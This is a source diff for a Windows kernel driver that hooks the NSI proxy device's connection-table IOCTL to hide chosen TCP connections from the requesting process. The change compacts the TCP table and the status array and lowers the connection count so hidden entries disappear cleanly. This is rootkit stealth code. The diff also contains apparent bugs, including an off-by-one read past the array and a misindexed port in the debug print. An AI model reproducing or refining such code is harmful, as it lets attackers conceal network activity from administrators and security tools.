@@ -66,7 +66,7 @@ BOOLEAN NsiHook::NetNSIFreeHook()
 }
 
 #if DBG
-static VOID PrintSocketAddr(ULONG localIP, USHORT localPort, ULONG foreignIP, USHORT foreignPort, ULONG cforeignIP)
+static VOID PrintSocketAddr(ULONG localIP, USHORT localPort, ULONG foreignIP, USHORT foreignPort)
 {
 	union
 	{
@@ -95,13 +95,6 @@ static VOID PrintSocketAddr(ULONG localIP, USHORT localPort, ULONG foreignIP, US
 	port.portbytes[0] = (foreignPort >> 8) & 0xFF;
 	port.portbytes[1] = foreignPort & 0xFF;
 	DbgPrint("%d.%d.%d.%d:%d\t", foreignbytes[0], foreignbytes[1], foreignbytes[2], foreignbytes[3], port.port);
-
-	ULONG cforeignbytes[4];
-	cforeignbytes[0] = cforeignIP & 0xFF;
-	cforeignbytes[1] = (cforeignIP >> 8) & 0xFF;
-	cforeignbytes[2] = (cforeignIP >> 16) & 0xFF;
-	cforeignbytes[3] = (cforeignIP >> 24) & 0xFF;
-	DbgPrint("%d.%d.%d.%d\n", cforeignbytes[0], cforeignbytes[1], cforeignbytes[2], cforeignbytes[3]);
 }
 #endif
 
@@ -117,37 +110,41 @@ NTSTATUS NsiHook::NetNSIProxyCompletionRoutine(
 		goto free_exit;
 	}
 
-	PNSI_STRUCTURE_1 NsiStructure1 = (PNSI_STRUCTURE_1)Irp->UserBuffer;
-	if (!MmIsAddressValid(NsiStructure1->Entries))
+	NSI_PARAM<SIZE_T>* NsiParam = (NSI_PARAM<SIZE_T> *)Irp->UserBuffer;	
+	if (!MmIsAddressValid(NsiParam->lpMem))
 	{
 		goto free_exit;
 	}
 
-	if (NsiStructure1->EntrySize != sizeof(NSI_STRUCTURE_ENTRY))
+	if ((NsiParam->UnknownParam8 != 0x38))
 	{
-		goto free_exit;
+		KdPrint(("NsiParam->UnknownParam8:[0x%x]\n", NsiParam->UnknownParam8));
 	}
 
 	KeStackAttachProcess(HookedContext->RequestingProcess, &ApcState);
-
-	PINTERNAL_TCP_TABLE_ENTRY pTcpEntry = (PINTERNAL_TCP_TABLE_ENTRY)NsiStructure1->Entries;
-#if DBG
-	PNSI_STRUCTURE_ENTRY NsiBufferEntries = &(NsiStructure1->Entries->EntriesStart[0]);
-#endif 
-
-	for (ULONG i = 0; i < NsiStructure1->NumberOfEntries; i++)
+	PNSI_STATUS_ENTRY pStatusEntry = (PNSI_STATUS_ENTRY)NsiParam->lpStatus;
+	PINTERNAL_TCP_TABLE_ENTRY pTcpEntry = (PINTERNAL_TCP_TABLE_ENTRY)NsiParam->lpMem;
+	SIZE_T numOfEntries = NsiParam->TcpConnCount;
+	for (SIZE_T i = 0; i < numOfEntries; i++)
 	{
 #if DBG
 		PrintSocketAddr(pTcpEntry[i].localEntry.dwIP, pTcpEntry[i].localEntry.Port,
-			pTcpEntry[i].remoteEntry.dwIP, pTcpEntry->remoteEntry.Port,
-			NsiBufferEntries[i].IpAddress);
+			pTcpEntry[i].remoteEntry.dwIP, pTcpEntry->remoteEntry.Port);
 #endif
 
 		if (NetHook::NetIsHiddenIpAddress(pTcpEntry[i].localEntry.dwIP,
 			pTcpEntry[i].localEntry.Port,
 			pTcpEntry[i].remoteEntry.dwIP))
 		{
-			RtlZeroMemory(&pTcpEntry[i], sizeof(INTERNAL_TCP_TABLE_ENTRY));
+			// RtlZeroMemory(&pTcpEntry[i], sizeof(INTERNAL_TCP_TABLE_ENTRY));
+			
+			// NSI will map status array entry to tcp table array entry
+			// we must modify both synchronously
+			RtlCopyMemory(&pTcpEntry[i], &pTcpEntry[i + 1], sizeof(INTERNAL_TCP_TABLE_ENTRY) * (numOfEntries - i));
+			RtlCopyMemory(&pStatusEntry[i], &pStatusEntry[i + 1], sizeof(NSI_STATUS_ENTRY) * (numOfEntries - i));
+			numOfEntries--;
+			NsiParam->TcpConnCount--;
+			i--;
 		}
 	}
 
@@ -190,10 +187,20 @@ NTSTATUS NsiHook::NetNSIProxyDeviceControlHook(
 
 	if (IOCTL_NSI_GETALLPARAM == io_control_code)
 	{
-		if (IrpStack->Parameters.DeviceIoControl.InputBufferLength != sizeof(_NSI_STRUCTURE_1))
+#if DBG
+		if ((IrpStack->Parameters.DeviceIoControl.InputBufferLength == 112 || IrpStack->Parameters.DeviceIoControl.InputBufferLength == 60))
 		{
-			KdPrint(("InputBufferLength:%lu sizeof(NSI_STRUCTURE):%lu\n", IrpStack->Parameters.DeviceIoControl.InputBufferLength, sizeof(_NSI_STRUCTURE_1)));
+			_declspec(align(sizeof(32))) NSI_PARAM<SIZE_T> param_test{};
+			KdPrint(("InputBufferLength:%lu sizeof(NSI_PARAM<SIZE_T>):%lu sizeof(param_test):%lu\n",
+				IrpStack->Parameters.DeviceIoControl.InputBufferLength, 
+				sizeof(NSI_PARAM<SIZE_T>), 
+				sizeof(param_test)));
 		}
+		else
+		{
+			KdPrint(("Unknown Length: InputBufferLength:%lu\n", IrpStack->Parameters.DeviceIoControl.InputBufferLength));
+		}
+#endif
 
 		//if call is relevent hook the CompletionRoutine
 		PHOOKED_IO_COMPLETION hook = (PHOOKED_IO_COMPLETION)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(HOOKED_IO_COMPLETION), TAG_NET);
